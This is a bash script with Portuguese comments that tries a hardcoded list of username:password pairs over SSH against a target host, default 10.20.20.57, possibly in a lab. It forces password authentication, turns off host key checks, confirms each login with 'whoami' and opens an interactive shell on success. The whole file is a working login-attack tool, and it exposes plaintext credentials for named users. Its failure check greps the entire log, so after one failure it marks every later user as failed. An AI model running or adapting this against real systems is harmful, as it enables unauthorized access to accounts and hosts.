#!/usr/bin/env bash
set -euo pipefail

TARGET="${1:-10.20.20.57}"
SSH_BIN="${SSH_BIN:-/tmp/openssh-root/usr/bin/ssh}"
LOG_FILE="${LOG_FILE:-/tmp/ssh_pair_test_$(date +%F_%H%M%S).log}"

# Teste 1:1 com pares conhecidos (sem combinacao cruzada).
PAIRS=(
  "jonasf:minecraft123"
  "nickj:ZeqlcR2!4gN"
  "joshuaa:QW5al7oPN2-1"
  "joaos:F147-0356agipV"
  "leonardz:averylongpasswordfornohackertodiscover"
  "anneh:VSZ785-aWB15#q"
  "dmitrip:42W#wskb-62wA\$sc"
)

if [[ ! -x "${SSH_BIN}" ]]; then
  echo "[!] SSH nao encontrado em ${SSH_BIN}"
  echo "[i] Ajusta com: export SSH_BIN=/tmp/openssh-root/usr/bin/ssh"
  exit 1
fi

if ! command -v script >/dev/null 2>&1; then
  echo "[!] comando 'script' nao encontrado."
  exit 1
fi

touch "${LOG_FILE}" 2>/dev/null || LOG_FILE="/tmp/ssh_pair_test_fallback_$(date +%F_%H%M%S).log"
touch "${LOG_FILE}" 2>/dev/null || {
  echo "[!] Sem permissao para criar log. Vai rodar sem log em arquivo."
  LOG_FILE="/dev/null"
}

echo "[*] Target: ${TARGET}" | tee -a "${LOG_FILE}"
echo "[*] SSH_BIN: ${SSH_BIN}" | tee -a "${LOG_FILE}"
echo "[*] Log: ${LOG_FILE}" | tee -a "${LOG_FILE}"
echo "" | tee -a "${LOG_FILE}"

for pair in "${PAIRS[@]}"; do
  user="${pair%%:*}"
  pass="${pair#*:}"

  echo "[*] Testando ${user} (1:1)" | tee -a "${LOG_FILE}"
  echo "[i] Quando pedir senha, usa: ${pass}" | tee -a "${LOG_FILE}"

  # Usa 'script' para forcar pseudo-tty no ambiente atual.
  # Executa comando curto para validar autenticacao.
  set +e
  script -q -c "${SSH_BIN} \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o PreferredAuthentications=password \
    -o PubkeyAuthentication=no \
    -o ConnectTimeout=5 \
    ${user}@${TARGET} 'whoami'" /dev/null | tee -a "${LOG_FILE}"
  rc=$?
  set -e

  if grep -qi "Permission denied" "${LOG_FILE}"; then
    echo "[-] Falhou para ${user}" | tee -a "${LOG_FILE}"
  elif [[ ${rc} -eq 0 ]]; then
    echo "[+] Possivel sucesso para ${user}" | tee -a "${LOG_FILE}"
    echo "[+] Abrindo sessao interativa..." | tee -a "${LOG_FILE}"
    exec "${SSH_BIN}" \
      -o StrictHostKeyChecking=no \
      -o UserKnownHostsFile=/dev/null \
      "${user}@${TARGET}"
  else
    echo "[!] Resultado inconclusivo para ${user} (rc=${rc})" | tee -a "${LOG_FILE}"
  fi

  echo "" | tee -a "${LOG_FILE}"
done

echo "[-] Nenhum par validado com sucesso."
echo "[i] Revisa o log: ${LOG_FILE}"
